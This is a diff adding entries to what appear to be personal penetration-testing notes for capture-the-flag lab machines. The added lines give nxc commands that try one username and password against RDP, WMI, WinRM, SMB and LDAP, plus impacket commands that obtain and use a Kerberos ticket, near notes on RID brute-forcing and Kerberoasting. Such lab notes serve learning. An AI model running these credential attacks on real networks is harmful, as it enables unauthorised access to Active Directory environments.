@@ -70,6 +70,10 @@ prompt OFF
 mget *
 ```
 
+
+```bash
+for service in rdp wmi winrm smb ldap; do   nxc $service -l 'ryan.naylor' -p 'HollowOct31Nyt' done
+```
 ## **User Enumeration (`crackmapexec --rid-brute`)**
 
 It tells **CrackMapExec**:
@@ -213,7 +217,25 @@ while true; do ntpdate -s fluffy.htb; done
 ```
 
 ---
+### TGT
 
+```shell
+# Get Kerberos TGT (writes .ccache)
+impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
+
+# Point env to the ticket cache
+export KRB5CCNAME=/home/kali/Voleur/ryan.naylor.ccache
+
+# Use Kerberos ticket for LDAP and the -k Kerberos option (use Kerberos ticke
+nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
+
+# Use Kerberos ticket for SMB and the -k Kerberos option (use Kerberos ticke
+nxc smb voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
+```
+
+
+
+___
 # **Kerberoasting**
 
 ### Request All TGS Ticket:
